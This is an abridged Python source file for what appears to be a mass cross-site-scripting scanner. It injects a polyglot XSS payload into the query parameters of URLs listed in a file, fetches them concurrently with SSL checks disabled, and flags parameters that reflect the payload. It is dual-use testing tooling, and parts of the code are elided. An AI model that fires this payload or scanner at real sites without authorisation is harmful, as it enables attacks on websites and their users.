# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-MXS\func.py
import asyncio
import time
...
class MassScanner:
    def __init__(
        self, file, output, concurrency, timeout, payload=False, redactDomains=False
    ):
        self.file = file
        self.output = output
        ...
        self.polygotPayload = quote(
            """"jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )////</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e"""
        )
    ...
    def generatePayloadURLs(self, url):
        ...
        for key in queryParams.keys():
            ...
            modifiedUrl = urlunsplit(
                (scheme, netloc, path, modifiedQueryString, fragment)
            )
    ...
    async def fetch(
        self, sem: asyncio.Semaphore, session: aiohttp.ClientSession, url: str
    ):
        async with sem:
            try:
                responseText = ""
    ...
    def processTasks(self, done):
        for task in done:
            ...
            if self.payload in responseText:
                ...
                self.totalFound += 1
                print(
                    f"{Fore.RED} [+] Vulnerable parameter found: {Fore.WHITE} {(self.redactURL(url) if self.redactDomains else url)}"
                )
    ...
    async def scan(self):
        ...
        async with aiohttp.ClientSession(
            ...
            connector=aiohttp.TCPConnector(
                ssl=False, limit=0, enable_cleanup_closed=True
            ),
        ) as session:
                ...
                while line:
                    ...
                    while len(pending) < self.concurrency and line:
                        ...
                        for url in urlsWithPayload:
                            pending.append(
                                asyncio.ensure_future(self.fetch(sem, session, url))
                            )
                        line = urlsFile.readline()
                    ...
                    print(
                        f"{Fore.YELLOW} [i] Scanned {self.totalScanned} URLs. Found {self.totalFound} injectable URLs",
                        end="\r",
                    )
    ...
    def run(self):
        ...
        print(
            f"{Fore.YELLOW} [i] Scanning finished. All URLs are saved to {self.output}"
        )
